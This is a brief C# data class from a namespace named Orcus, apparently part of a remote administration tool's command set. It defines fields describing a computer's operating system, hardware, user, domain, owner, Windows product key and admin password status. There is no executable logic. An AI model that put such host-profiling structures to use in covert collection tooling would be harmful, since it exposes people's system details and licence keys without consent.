using System;

namespace Orcus.Shared.Commands.ComputerInformation
{
    [Serializable]
    public class OperatingSystemInformation
    {
        public string FriendlyName { get; set; }
        public string NtVersion { get; set; }
        public string Version { get; set; }
        public string InternalName { get; set; }
        public string Architecture { get; set; }
        public string Platform { get; set; }
        public string SystemDirectory { get; set; }
        public string BootMode { get; set; }
        public string ClrVersion { get; set; }
        public ulong TotalPhysicalMemory { get; set; }
        public int SystemPageSize { get; set; }

        public string ProductKey { get; set; }
        public string UserName { get; set; }
        public string UserDomainName { get; set; }
        public string AdminPasswordStatus { get; set; }
        public string Workgroup { get; set; }
        public string Manufacturer { get; set; }
        public string Model { get; set; }
        public string Owner { get; set; }
    }
}